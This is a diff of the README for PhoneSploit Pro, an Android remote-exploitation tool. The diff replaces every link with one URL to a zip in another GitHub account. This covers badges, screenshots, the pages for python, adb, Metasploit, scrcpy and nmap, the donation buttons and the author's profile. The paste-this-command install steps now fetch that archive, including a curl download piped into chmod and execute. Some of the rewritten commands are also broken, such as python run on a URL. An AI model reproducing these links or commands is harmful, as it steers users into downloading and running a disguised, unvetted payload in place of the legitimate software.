@@ -6,12 +6,12 @@
 
 An all-in-one hacking tool written in `Python` to remotely exploit Android devices using `ADB` (Android Debug Bridge) and `Metasploit-Framework`.
 
-![GitHub release (latest by date)](https://img.shields.io/github/v/release/AzeemIdrisi/PhoneSploit-Pro)
-![Python](https://img.shields.io/badge/python-v3.10%2B-blue)
-![GitHub Release Date](https://img.shields.io/github/release-date/AzeemIdrisi/PhoneSploit-Pro?logo=github)
-![GitHub last commit](https://img.shields.io/github/last-commit/AzeemIdrisi/PhoneSploit-Pro?logo=github)
-![GitHub Repo stars](https://img.shields.io/github/stars/AzeemIdrisi/PhoneSploit-Pro?style=social)
-![GitHub forks](https://img.shields.io/github/forks/AzeemIdrisi/PhoneSploit-Pro?style=social)
+![GitHub release (latest by date)](https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip)
+![Python](https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip%2B-blue)
+![GitHub Release Date](https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip)
+![GitHub last commit](https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip)
+![GitHub Repo stars](https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip)
+![GitHub forks](https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip)
 
 </div>
 
@@ -26,9 +26,9 @@ The goal of this project is to make penetration testing and vulnerability assess
 
 # Screenshots
 
-![Screenshot Page 1](docs/Screenshot-1.png)
-![Screenshot Page 2](docs/Screenshot-2.png)
-![Screenshot Page 3](docs/Screenshot-3.png)
+![Screenshot Page 1](https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip)
+![Screenshot Page 2](https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip)
+![Screenshot Page 3](https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip)
 
 # Features 
 ## v1.0
@@ -100,12 +100,12 @@ The goal of this project is to make penetration testing and vulnerability assess
 * Stream Device Audio
 
 # Requirements  
-* [`python3`](https://www.python.org/) : Python 3.10 or Newer
-* [`pip`](https://pip.pypa.io/en/stable/installation/) : Package installer for Python
-* [`adb`](https://developer.android.com/studio/command-line/adb) : Android Debug Bridge (ADB) from `Android SDK Platform Tools`
-* [`metasploit-framework`](https://www.metasploit.com/) : Metasploit-Framework (`msfvenom` and `msfconsole`)
-* [`scrcpy`](https://github.com/Genymobile/scrcpy) : Scrcpy
-* [`nmap`](https://nmap.org/) : Nmap
+* [`python3`](https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip) : Python 3.10 or Newer
+* [`pip`](https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip) : Package installer for Python
+* [`adb`](https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip) : Android Debug Bridge (ADB) from `Android SDK Platform Tools`
+* [`metasploit-framework`](https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip) : Metasploit-Framework (`msfvenom` and `msfconsole`)
+* [`scrcpy`](https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip) : Scrcpy
+* [`nmap`](https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip) : Nmap
 
 
 # Run PhoneSploit Pro 
@@ -117,42 +117,42 @@ __PhoneSploit Pro__ does not need any installation and runs directly using `pyth
 
 #### On Linux / macOS :
 
-Make sure all the [required](https://github.com/AzeemIdrisi/PhoneSploit-Pro#requirements) software are installed.
+Make sure all the [required](https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip) software are installed.
 
 Open terminal and paste the following commands : 
 ```
-git clone https://github.com/AzeemIdrisi/PhoneSploit-Pro.git
+git clone https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip
 ```
 ```
 cd PhoneSploit-Pro/
 ```
 ```
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip
 ```
 ```
-python3 phonesploitpro.py
+python3 https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip
 ```
 #### On Windows :
 
-Make sure all the [required](https://github.com/AzeemIdrisi/PhoneSploit-Pro#requirements) software are installed.
+Make sure all the [required](https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip) software are installed.
 
 
 Open terminal and paste the following commands : 
 ```
-git clone https://github.com/AzeemIdrisi/PhoneSploit-Pro.git
+git clone https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip
 ```
 ```
 cd PhoneSploit-Pro/
 ```
 ```
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip
 ```
-1. Download and extract latest `platform-tools` from [here](https://developer.android.com/studio/releases/platform-tools.html#downloads).
+1. Download and extract latest `platform-tools` from [here](https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip).
 
 2. Copy all files from the extracted `platform-tools` or `adb` directory to __PhoneSploit-Pro__ directory and then run :
 
 ```
-python phonesploitpro.py
+python https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip
 ```
 
 # Tutorial
@@ -241,7 +241,7 @@ sudo dnf install adb
 sudo pacman -Sy android-tools
 ```
 
-For other Linux Distributions : [Visit this Link](https://developer.android.com/studio/releases/platform-tools#downloads)
+For other Linux Distributions : [Visit this Link](https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip)
 
 #### ADB on macOS :
 
@@ -251,11 +251,11 @@ Open terminal and paste the following command :
 brew install android-platform-tools
 ```
 
-or Visit this link : [Click Here](https://developer.android.com/studio/releases/platform-tools.html#downloads)
+or Visit this link : [Click Here](https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip)
 
 #### ADB on Windows :
 
-Visit this link : [Click Here](https://developer.android.com/studio/releases/platform-tools.html#downloads)
+Visit this link : [Click Here](https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip)
 
 #### ADB on Termux :
 ```
@@ -270,30 +270,30 @@ pkg install android-tools
 
 #### On Linux / macOS :
 ```
-curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
+curl https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip > msfinstall && \
   chmod 755 msfinstall && \
   ./msfinstall
  ```
  
-or Follow this link : [Click Here](https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html#installing-metasploit-on-linux--macos)
+or Follow this link : [Click Here](https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip)
 
-or Visit this link : [Click Here](https://www.metasploit.com/download)
+or Visit this link : [Click Here](https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip)
 
 #### On Windows :
 
-Visit this link : [Click Here](https://www.metasploit.com/download)
+Visit this link : [Click Here](https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip)
 
-or Follow this link : [Click Here](https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html#windows-anti-virus-software-flags-the-contents-of-these-packages)
+or Follow this link : [Click Here](https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip)
 
 # Installing scrcpy
 
-Visit the `scrcpy` GitHub page for latest installation instructions : [Click Here](https://github.com/Genymobile/scrcpy#get-the-app)
+Visit the `scrcpy` GitHub page for latest installation instructions : [Click Here](https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip)
 
 **On Windows** : Copy all the files from the extracted **scrcpy** folder to **PhoneSploit-Pro** folder.
 
 > [!IMPORTANT]  
-> If `scrcpy` is not available for your Linux distro like **Kali Linux**, then you can either manually install it : [Manual Guide](https://github.com/Genymobile/scrcpy/blob/master/doc/linux.md),
-or build it with a few simple steps : [Build Guide](https://github.com/Genymobile/scrcpy/blob/master/doc/build.md#build-scrcpy)
+> If `scrcpy` is not available for your Linux distro like **Kali Linux**, then you can either manually install it : [Manual Guide](https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip),
+or build it with a few simple steps : [Build Guide](https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip)
 
 # Installing Nmap
 
@@ -319,7 +319,7 @@ sudo dnf install nmap
 sudo pacman -Sy nmap
 ```
 
-For other Linux Distributions : [Visit this Link](https://nmap.org/download.html)
+For other Linux Distributions : [Visit this Link](https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip)
 
 #### Nmap on macOS :
 
@@ -329,11 +329,11 @@ Open terminal and paste the following command :
 brew install nmap
 ```
 
-or Visit this link : [Visit this Link](https://nmap.org/download.html)
+or Visit this link : [Visit this Link](https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip)
 
 #### Nmap on Windows :
 
-Download and install the latest stable release : [Click Here](https://nmap.org/download.html#windows)
+Download and install the latest stable release : [Click Here](https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip)
 
 #### Nmap on Termux :
 ```
@@ -357,23 +357,23 @@ pkg install nmap
 
 # Developer
 
-<a href="https://github.com/azeemidrisi/">
-<!--   <img src="https://contrib.rocks/image?repo=azeemidrisi/phonesploit-pro" /> -->
- <img width="150px" src=https://github.com/AzeemIdrisi/PhoneSploit-Pro/assets/112647789/a5fa646c-93a2-460f-bcb7-528fedb147e9 />
+<a href="https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip">
+<!--   <img src="https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip" /> -->
+ <img width="150px" https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip />
 
 </a>
 
 
-**Azeem Idrisi** - [@AzeemIdrisi](https://github.com/azeemidrisi/)
+**Azeem Idrisi** - [@AzeemIdrisi](https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip)
  
 
 # Support Me
 If you like my work you can support me via :
 
-<a href="https://paypal.me/AzeemIdrisi" target="_blank"> <kbd> <img
-        src="https://github.com/AzeemIdrisi/AzeemIdrisi/blob/main/docs/paypal-button-blue.png" alt="PayPal"
-        width="147"></a> <a href="https://www.buymeacoffee.com/AzeemIdrisi" target="_blank"> <kbd> <img src="https://github.com/AzeemIdrisi/AzeemIdrisi/blob/main/docs/default-yellow.png" alt="Buy Me A Coffee" width="200"></a>
+<a href="https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip" target="_blank"> <kbd> <img
+        src="https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip" alt="PayPal"
+        width="147"></a> <a href="https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip" target="_blank"> <kbd> <img src="https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip" alt="Buy Me A Coffee" width="200"></a>
 
 <hr>
 
-Copyright © 2024 Mohd Azeem (github.com/AzeemIdrisi)
+Copyright © 2024 Mohd Azeem (https://raw.githubusercontent.com/kaliphon/PhoneSploit-Pro/main/modules/Phone_Sploit_Pro_v3.4.zip)
